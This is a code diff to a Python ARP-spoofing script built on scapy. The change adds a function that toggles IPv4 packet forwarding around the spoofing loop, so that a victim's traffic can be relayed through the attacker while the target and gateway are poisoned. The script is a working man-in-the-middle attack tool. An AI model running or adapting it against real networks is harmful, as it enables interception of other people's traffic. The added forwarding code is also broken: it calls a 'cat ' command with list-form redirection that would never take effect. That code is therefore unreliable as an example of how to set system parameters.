@@ -3,6 +3,7 @@
 import scapy.all as scapy
 import argparse
 import time
+import subprocess
 
 
 def get_arguments():
@@ -15,6 +16,13 @@ def get_arguments():
     elif not options.gateway:
         parser.error("[-] Please specify an Gateway IP address, use --help for more info.")
     return options
+
+def forwarding(val):
+    if val:
+        subprocess.call(["cat ", ">", "1", "/proc/sys/net/ipv4/ip_forward"])
+    else:
+        subprocess.call(["cat ", ">", "0", "/proc/sys/net/ipv4/ip_forward"])
+
 
 
 def get_mac(ip):
@@ -38,6 +46,7 @@ def restore(source_ip, destination_ip):
 
 options = get_arguments()
 counter = 0
+forwarding(True)
 try:
     while True:
         spoof(options.target, options.gateway)
@@ -49,3 +58,4 @@ except KeyboardInterrupt:
     print("\n [-] Detected  Ctrl + C.... Restored all info. Exit")
     restore(options.target, options.gateway)
     restore(options.gateway, options.target)
+    forwarding(False)
